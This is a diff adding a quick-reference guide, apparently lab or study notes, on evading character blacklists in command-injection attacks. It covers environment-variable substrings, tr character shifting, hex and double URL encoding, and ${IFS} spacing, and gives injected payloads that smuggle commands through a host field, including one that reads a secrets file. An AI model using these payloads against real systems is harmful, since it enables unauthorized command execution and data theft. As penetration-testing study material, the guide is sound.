@@ -98,6 +98,144 @@ Host: 127.0.0.1%0a{ls,-la}     # newline + brace expansion
 * Observe server behavior: "Invalid input" often indicates server-side filtering; change only one character at a time while testing.
 
 ---
+# Quick Guide — Bypassing Other Blacklisted Characters (slashes, semicolons, etc.)
+
+Short, practical reference for techniques that let you produce characters that are blocked ( `/` `\` `;` etc. ). Only use in authorized testing.
+
+---
+
+## 1) Use environment-variable substring (Linux)
+
+Many env vars contain the character you need. Take a 1-char slice.
+
+```bash
+# PATH often begins with "/"
+echo "${PATH:0:1}"     # -> /
+
+# LS_COLORS may contain a ';'
+echo "${LS_COLORS:10:1}"  # -> ;
+```
+
+Use the same notation inside an injected payload (no `echo` needed):
+
+```
+127.0.0.1%0a${PATH:0:1}usr${PATH:0:1}bin
+```
+
+---
+
+## 2) Use environment-variable substring (Windows CMD)
+
+CMD supports substring syntax `%VAR:~start,length%`.
+
+```cmd
+:: HOMEPATH looks like \Users\name
+echo %HOMEPATH:~0,1%   :: -> '\'
+:: complex example from prompt
+echo %HOMEPATH:~6,-11% :: -> '\'
+```
+
+PowerShell indexing (env vars as arrays / strings):
+
+```powershell
+$env:HOMEPATH[0]   # -> '\'
+$env:PROGRAMFILES[10]  # example: single-character access
+```
+
+Use these inside payloads where Windows cmd expands env vars.
+
+---
+
+## 3) Character shifting (tr hack, Linux)
+
+Shift input chars by +1 using `tr` mapping. Find the character *before* your target in ASCII, then shift.
+
+Example: produce `\` (92) by giving `[` (91):
+
+```bash
+# map '!-}' -> '"-~' (shifts bytes by +1)
+echo $(tr '!-}' '"-~' <<< '[')   # -> '\'
+```
+
+To get `;` (59), use the char before it (`:` / 58):
+
+```bash
+echo $(tr '!-}' '"-~' <<< ':')   # -> ';'
+```
+
+(You can embed this style in payloads if the target executes shell commands.)
+
+---
+
+## 4) Hex / escape sequences (printf / echo -e)
+
+When direct characters are blocked, use hex escapes.
+
+Linux shell:
+
+```bash
+# slash
+printf '\x2f'   # -> /
+
+# backslash
+printf '\x5c'   # -> \
+
+# semicolon
+printf '\x3b'   # -> ;
+```
+
+Some languages/processors accept `$'\xNN'` notation too:
+
+```bash
+echo $'\x2f'   # -> /
+```
+
+---
+
+## 5) URL / percent encodings & double-encoding
+
+Encode the character and try single or double decode bypasses:
+
+* `/` -> `%2f` or `%2F`
+* `/` double-encoded -> `%252f` (server decodes once -> `%2f` -> decoded later -> `/`)
+
+Some middlewares only decode once — double-encoding can bypass naive filters.
+
+---
+
+## 6) Alternate whitespace & separators
+
+(Useful when slash is used to separate path components with spaces around them)
+
+* Use `${IFS}` for spaces and tabs
+* Use tab `%09` or literal `\t` rather than ASCII space
+* Use brace expansion to avoid literal separators: `{ls,-la}` -> `ls -la`
+
+---
+
+## 7) Combine tricks
+
+You can compose techniques. Example: produce a path without `/` literal by inserting `${PATH:0:1}` for slashes and `${IFS}` for spaces:
+
+```
+127.0.0.1%0acat${IFS}${HOME}${PATH:0:1}secret.txt
+```
+
+---
+
+## 8) Exercise / quick answer hint
+
+**Exercise:** produce `;` using character shifting.
+
+* Semicolon `;` ASCII = 59 → character before is `:` (58).
+* Use the `tr '!-}' '"-~'` trick with `:` as input:
+
+```bash
+echo $(tr '!-}' '"-~' <<< ':')   # outputs ';'
+```
+
+---
+
 
 
 
